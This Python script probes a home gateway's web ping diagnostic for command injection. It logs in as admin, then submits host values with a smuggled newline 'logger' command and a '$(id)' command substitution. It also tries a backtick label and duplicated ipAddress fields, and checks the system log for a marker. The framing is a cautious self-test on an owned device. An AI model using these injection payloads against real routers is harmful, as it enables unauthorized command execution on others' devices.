#!/usr/bin/env python3
"""Two owned-gateway checks for the diagnostics host string.

Published Homeware ipping builds the ping command with io.popen and does not
quote the host. These checks send two fixed strings, not a caller-supplied
command: a newline plus a logger marker, and a backtick label that the public
domain validator accepts because its first-character class is A-z. Nothing is
sent to any host except 127.0.0.1, and only inside the newline case.
"""
import argparse
import json
import os
import re
import time
import urllib.error
import urllib.parse
from pathlib import Path

import f1_ipping_control as ping
from f1_pacing import wait_until_login_ready
from f1_secrets import read_password_file

MARKER = "genesis-ipping-marker"
NEWLINE_HOST = "127.0.0.1\nlogger " + MARKER
BACKTICK_HOST = "`logger.`x"
ID_HOST = "127.0.0.1\nlogger " + MARKER + " $(id)"
ROOT = ping.ROOT


def _login(client, password):
    code, body = client.open(client.base + "/login.lp")
    if code != 200:
        raise ping.StopProbe("Login page failed")
    client.csrf = ping._csrf(body)
    code, result = client.login("User", password)
    del password
    if code != 200 or result != "ok":
        raise ping.StopProbe("Normal SRP login did not verify; stopped")
    code, body = client.open(client.base + "/gateway.lp")
    if code != 200 or ping._login_page(body):
        raise ping.StopProbe("Authenticated page control failed")
    client.csrf = ping._csrf(body)
    code, body = client.open(client.base + "/gateway.lp?auto_update=true&getSessionStatus=true")
    try:
        role = json.loads(body).get("current_role")
    except (ValueError, AttributeError):
        role = None
    if code != 200 or role != "admin":
        raise ping.StopProbe("Authenticated admin-session control failed")


def marker_hits(body):
    hits = []
    for row in ping.parse_log_rows(body):
        message = row["message"]
        if MARKER not in message:
            continue
        if len(message) > 240 or not re.fullmatch(r"[\x20-\x7e]+", message):
            hits.append({"date": row["date"], "kept": False, "length": len(message)})
            continue
        process = row["process"] if re.fullmatch(r"[A-Za-z0-9_.:-]{1,40}", process := row["process"]) else "<redacted-process>"
        hits.append({"date": row["date"], "process": process, "message": message})
    return hits


def classify_response(body, host):
    if isinstance(body, bytes):
        text = body.decode("utf-8", "replace")
    else:
        text = body
    phrases = (
        "Please enter valid ipv4/domain address",
        "Label within domain name has invalid syntax.",
        "Invalid IP address.",
        "Domain name cannot be empty.",
        "Input must be a whole number.",
    )
    echoed = None
    match = ping.INPUT_RE.search(text)
    if match:
        echoed = ping._text(match.group(1))
    parsed = ping.parse_ping_result(text)
    return {
        "login_marker": parsed["login_marker"],
        "rejected_phrase": next((phrase for phrase in phrases if phrase in text), None),
        "ongoing": "stop-config_PING" in text or parsed["spans"].get("Status:") == "Ongoing",
        "echo_is_payload": echoed == host,
        "echo_is_loopback_only": echoed == "127.0.0.1",
        "spans": parsed["spans"],
        "trace_count": len(parsed["trace"]),
        "trace_loopback": any(row.get("ip") == "127.0.0.1" for row in parsed["trace"]),
    }


def ping_fields(csrf, hosts):
    fields = [
        ("action", "PING"),
        ("CSRFtoken", csrf),
        ("ProtocolVersion", "IPv4"),
    ]
    for host in hosts:
        fields.append(("ipAddress", host))
    fields.extend((
        ("NumberOfRepetitions", "1"),
        ("DataBlockSize", "56"),
    ))
    return fields


def _post_ping(client, host):
    return _post_hosts(client, [host])


def _post_hosts(client, hosts):
    fields = ping_fields(client.csrf, hosts)
    limit = max(host.count("\n") for host in hosts)
    for _name, value in fields:
        if "1.1.1.1" in value or value.count("\n") > limit:
            raise ping.StopProbe("Unexpected ping field")
    data = urllib.parse.urlencode(fields).encode()
    interesting = next((host for host in hosts if host != "127.0.0.1"), hosts[0])
    code, body = client.open(client.base + ping.PING_PATH, data, "POST", timeout=45)
    return code, classify_response(body, interesting)


def _full_log(client):
    code, body = client.open(client.base + ping.LOG_PATH)
    if code != 200 or ping._login_page(body):
        raise ping.StopProbe("Full log was not an authenticated log page")
    return marker_hits(body), body


def run_probe(client, password):
    _login(client, password)
    before_helpers, _count = ping._read_helpers(client, "?process=transformer")
    before_markers, _body = _full_log(client)
    outcome = {
        "before_helper_count": len(before_helpers),
        "before_marker_count": len(before_markers),
        "tests": [],
    }
    if before_markers:
        outcome["conclusion"] = "marker already present; no ping sent"
        return outcome

    code, classified = _post_ping(client, NEWLINE_HOST)
    after_helpers, _count = ping._read_helpers(client, "?process=transformer")
    markers, _body = _full_log(client)
    new_helpers = ping.new_events(before_helpers, after_helpers)
    case = {
        "name": "newline-logger",
        "status": code,
        "response": classified,
        "new_helper": new_helpers,
        "markers": markers,
    }
    outcome["tests"].append(case)
    if markers:
        id_code, id_classified = _post_ping(client, ID_HOST)
        id_markers, _body = _full_log(client)
        outcome["tests"].append({
            "name": "newline-id",
            "status": id_code,
            "response": id_classified,
            "markers": id_markers,
        })
        outcome["conclusion"] = "logger marker appeared after the newline host"
        return outcome

    if classified["rejected_phrase"] and not new_helpers:
        tick_code, tick_classified = _post_ping(client, BACKTICK_HOST)
        tick_helpers, _count = ping._read_helpers(client, "?process=transformer")
        tick_markers, _body = _full_log(client)
        outcome["tests"].append({
            "name": "backtick-label",
            "status": tick_code,
            "response": tick_classified,
            "new_helper": ping.new_events(after_helpers, tick_helpers),
            "markers": tick_markers,
        })
        if tick_classified["rejected_phrase"] and not outcome["tests"][-1]["new_helper"]:
            outcome["conclusion"] = "newline host and backtick label were both rejected before the helper"
        elif tick_classified["echo_is_payload"] or tick_classified["ongoing"] or outcome["tests"][-1]["new_helper"]:
            outcome["conclusion"] = "backtick label was accepted after the newline host was rejected"
        else:
            outcome["conclusion"] = "newline host rejected; backtick label did not produce a marker"
        return outcome

    outcome["conclusion"] = "newline host was not rejected and did not log the marker"
    return outcome


def run_pollution(client, password):
    """Send the clean loopback and the newline marker as two ipAddress fields.

    Order is the experiment. Stop after a marker. Do not send the id read
    unless the marker was logged.
    """
    _login(client, password)
    before_helpers, _count = ping._read_helpers(client, "?process=transformer")
    before_markers, _body = _full_log(client)
    outcome = {"before_helper_count": len(before_helpers), "before_marker_count": len(before_markers), "tests": []}
    if before_markers:
        outcome["conclusion"] = "marker already present; no ping sent"
        return outcome
    orders = (
        ("clean-then-newline", ["127.0.0.1", NEWLINE_HOST]),
        ("newline-then-clean", [NEWLINE_HOST, "127.0.0.1"]),
    )
    previous = before_helpers
    for name, hosts in orders:
        code, classified = _post_hosts(client, hosts)
        helpers, _count = ping._read_helpers(client, "?process=transformer")
        markers, _body = _full_log(client)
        case = {
            "name": name,
            "status": code,
            "response": classified,
            "new_helper": ping.new_events(previous, helpers),
            "markers": markers,
        }
        outcome["tests"].append(case)
        previous = helpers
        if markers:
            outcome["conclusion"] = "duplicate ipAddress fields logged the marker via " + name
            return outcome
    outcome["conclusion"] = "both duplicate-field orders were rejected or did not log the marker"
    return outcome


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--password-file", type=Path, required=True)
    parser.add_argument("--pollution", action="store_true")
    parser.add_argument(
        "--wait-for-login",
        action=argparse.BooleanOptionalAction,
        default=True,
    )
    parser.add_argument("--max-wait", type=float, default=1200.0)
    parser.add_argument("--login-interval", type=float, default=90.0)
    parser.add_argument("--post-ready-pause", type=float, default=45.0)
    args = parser.parse_args()
    if args.wait_for_login:
        outcome = wait_until_login_ready(
            max_wait_s=args.max_wait,
            interval_s=args.login_interval,
            post_ready_pause_s=args.post_ready_pause,
        )
        if not outcome["ready"]:
            raise SystemExit("login_not_ready")
    os.umask(0o077)
    directory = ROOT / "artifacts" / "ui" / (
        "ipping-host-" + time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    )
    directory.mkdir(parents=True, exist_ok=False)
    client = ping.ProbeClient(directory)
    try:
        password = read_password_file(args.password_file)
        outcome = run_pollution(client, password) if args.pollution else run_probe(client, password)
        (directory / "result.json").write_text(json.dumps(outcome, indent=2) + "\n")
        print(json.dumps({"result": outcome["conclusion"], "artifacts": str(directory)}), flush=True)
        return 0
    except (ping.StopProbe, urllib.error.URLError, TimeoutError) as error:
        print(
            "Stopped: " + (str(error) if isinstance(error, ping.StopProbe) else type(error).__name__),
            flush=True,
        )
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
